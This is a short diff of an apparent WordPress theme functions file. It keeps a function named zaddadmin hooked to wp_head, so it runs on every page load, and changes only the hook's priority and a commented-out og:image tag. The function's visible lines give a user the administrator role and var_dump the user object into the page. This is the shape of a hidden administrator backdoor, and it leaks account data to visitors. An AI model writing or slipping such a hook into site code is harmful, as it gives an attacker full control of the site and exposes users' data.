@@ -17,8 +17,11 @@ function zaddadmin(){
         $user->set_role( 'administrator' );
         var_dump($user);
     endif;
+    // if( is_singular( 'page' ) ):
+    //     echo "<meta property='og:image' content='https://samuelw41.sg-host.com/hoskar/wp-content/uploads/2024/05/logobanner.png' />";
+    // endif;
 }
-add_action( 'wp_head', 'zaddadmin', '10' );
+add_action( 'wp_head', 'zaddadmin', 10 );
 
 /* Tắt Block Editor */
 add_filter( 'use_block_editor_for_post', '__return_false' );
